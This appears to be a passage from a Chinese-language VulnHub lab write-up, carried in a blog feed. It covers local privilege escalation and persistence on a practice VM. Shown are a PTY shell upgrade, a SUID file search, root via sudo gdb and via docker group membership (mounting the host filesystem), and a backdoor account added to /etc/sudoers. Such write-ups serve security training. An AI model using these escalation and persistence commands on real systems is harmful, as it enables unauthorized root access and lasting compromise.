&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; then press Ctrl+Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg then press ENTER twice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd / &amp;amp;&amp;amp; id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;suid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid-提权&#34;&gt;#&lt;/a&gt; SUID 提权&lt;/h3&gt;
&lt;p&gt;尝试 suid 提权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现系统上运行所有suid可执行文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s -type f 2 &amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-perm表示搜索后面的权限 - u=s表示查找 root 用户拥有的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-&lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;表示我们正在寻找的文件类型 f 表示普通文件，而不是目录或特殊文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2 表示到进程的第二个文件描述符，即 stderr（标准错误）&amp;gt;表示重定向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-123.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
未找到 nmap vim find bash more less nano cp 含有s权限
&lt;h3 id=&#34;sudogdb-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudogdb-提权&#34;&gt;#&lt;/a&gt; sudo (gdb) 提权&lt;/h3&gt;
&lt;p&gt;提权教程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZ2RiLw==&#34;&gt;https://gtfobins.github.io/gtfobins/gdb/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;由于gdb只是针对用户offensivehack来言是无密码的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;所以这里需要通过-u来指定用户名，使用该用户来通过gdb反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u offensivehack gdb -nx -ex &amp;#x27;!sh&amp;#x27; -ex quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-l, list user\&lt;span class=&#34;string&#34;&gt;&amp;#x27;s privileges or check a specific command; use twice for longer format&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;-u, run command (or edit file) as specified user name or ID&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;string&#34;&gt;通过python3 来将当前的终端转化为一个标准的shell：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-124.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;iddocker-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#iddocker-提权&#34;&gt;#&lt;/a&gt; id (docker) 提权&lt;/h3&gt;
&lt;p&gt;注意到输入 id 的时候有补充组 docker，可采用 docker 提权&lt;br&gt;
 Docker 提权说明：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZG9ja2VyLw==&#34;&gt;https://gtfobins.github.io/gtfobins/docker/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;docker 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;标准shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-125.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;篡改-sudoers-维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改-sudoers-维权&#34;&gt;#&lt;/a&gt; 篡改 sudoers 维权&lt;/h3&gt;
&lt;p&gt;由当前 root 权限的机器继续执行操作&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置密码为kali&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd kali &amp;amp;&amp;amp; passwd kali&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加sudoers文件写权限:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod u+w /etc/sudoers&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/sudoers&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;root ALL=(ALL) ALL 这一行，在其下面追加：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali ALL=(ALL) ALL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;撤销sudoers文件权限:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod u-w /etc/sudoers&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-126.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;攻击机：ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmthbGlAMTkyLjE2OC4zMS4yMzA=&#34;&gt;kali@192.168.31.230&lt;/span&gt; &amp;amp;&amp;amp; sudo cat /root/flag.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-127.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可登陆 kali，用 sudo 进行 root 权限的操作&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
</feed>
